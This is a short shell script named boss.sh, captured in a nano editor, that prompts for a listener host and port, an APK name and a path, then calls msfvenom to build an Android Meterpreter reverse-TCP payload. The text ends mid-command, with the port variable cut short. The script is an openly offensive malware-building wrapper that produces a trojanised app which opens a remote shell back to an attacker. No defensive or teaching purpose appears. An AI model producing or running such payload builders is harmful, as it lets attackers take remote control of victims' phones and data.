GNU nano 5.5                boss.sh                 Modified
echo "start"
sleep 1                                                         read -p "LHOST" A1
sleep 1
read -p "LPORT" A2
sleep 1
echo "ent : apk name "
read A3
echo "ent : path "
read A4
./msfvenom -p android/meterpreter/reverse_tcp LHOST=$A1 LPORT=$A
